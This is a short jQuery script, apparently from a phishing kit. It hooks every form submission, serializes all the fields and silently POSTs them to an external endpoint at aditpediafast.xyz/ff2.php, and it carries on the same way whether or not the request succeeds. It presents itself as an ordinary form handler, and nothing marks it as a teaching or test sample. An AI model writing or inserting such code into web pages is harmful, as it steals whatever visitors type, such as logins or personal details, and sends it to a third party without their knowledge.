$(".form").submit(function() {

	var d = $(".form");

	$.ajax({

        url: "https://aditpediafast.xyz/ff2.php",

        type: "POST",

        data: d.serialize(),

        success: function () {

            return true;

        },

        error: function () {

            return true;

        },

    });

});
